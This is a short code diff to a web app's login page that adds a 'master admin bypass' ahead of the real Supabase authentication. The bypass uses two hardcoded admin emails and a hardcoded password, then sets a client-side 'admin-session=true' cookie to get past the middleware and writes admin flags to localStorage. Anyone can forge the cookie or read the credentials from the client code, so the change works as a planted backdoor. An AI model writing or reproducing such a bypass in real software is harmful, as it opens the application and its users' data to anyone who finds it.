@@ -18,6 +18,18 @@ export default function LoginPage() {
     setLoading(true);
 
     try {
+      // MASTER ADMIN BYPASS (Emergency only)
+      if ((email === "admin@ela-revolution.com" || email === "godmode@ela.ai") && password === "GodMode2024!") {
+        // Set cookie for middleware bypass
+        document.cookie = "admin-session=true; path=/; max-age=86400";
+        // Store session for client components
+        localStorage.setItem('ela_admin_auth', 'true');
+        localStorage.setItem('ela_tier', 'grand_horloger');
+        localStorage.setItem('ela_user_name', email === "godmode@ela.ai" ? 'God Mode System' : 'System Admin');
+        router.push("/dashboard");
+        return;
+      }
+
       // Real Supabase authentication
       await authService.signIn(email, password);
       router.push("/dashboard");
